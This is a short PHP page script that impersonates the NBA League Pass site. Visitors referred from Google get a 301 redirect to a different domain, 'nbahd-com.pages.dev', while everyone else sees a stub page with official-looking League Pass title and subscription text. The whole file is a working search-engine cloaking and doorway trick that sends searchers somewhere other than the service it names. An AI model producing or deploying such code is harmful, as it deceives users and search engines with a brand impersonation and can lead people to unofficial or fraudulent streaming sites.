<?php

$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';


if (strpos($referrer, 'google.com') !== false) {
    header("Location: nbahd-com.pages.dev", true, 301); 
    exit();
} else {
    
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>NBA League Pass | Experience Live NBA Games Anytime</title>
    </head>
    <body>
        <h1>NBA League Pass | Experience Live NBA Games Anytime ...</h1>
        <p>Season-long billing subscriptions provide live game access through the end of the regular season, select Summer League games on NBA TV, and on-demand.</p>
    </body>
    </html>";
}
?>
